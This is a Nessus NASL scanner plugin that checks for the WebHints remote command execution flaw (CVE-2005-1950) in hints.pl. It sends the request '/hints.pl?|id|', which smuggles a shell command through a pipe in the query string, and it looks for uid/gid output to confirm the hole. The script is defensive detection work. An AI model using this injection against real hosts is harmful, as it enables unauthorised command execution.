#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: blahplok yahoo com
# This script is released under the GNU GPL v2
#

desc = "
The remote host is running the WebHints scripts.

The remote version of this software is vulnerable to remote command 
execution flaw through the script 'hints.pl'.

A malicious user could exploit this flaw to execute arbitrary commands on 
the remote host.

Solution : No update currently available, delete this script.
Risk factor : High";


if(description)
{
 script_id(18478);
 script_cve_id("CVE-2005-1950");
 script_bugtraq_id(13930);
  
 script_version("$Revision: 1.6 $");
 name["english"] = "WebHints remote command execution flaw";
 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Checks for WebHints remote command execution flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			check_request:"/hints.pl?|id|",
			extra_check:"WebHints [0-9]+\.[0-9]+</A></SMALL></P></CENTER>",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
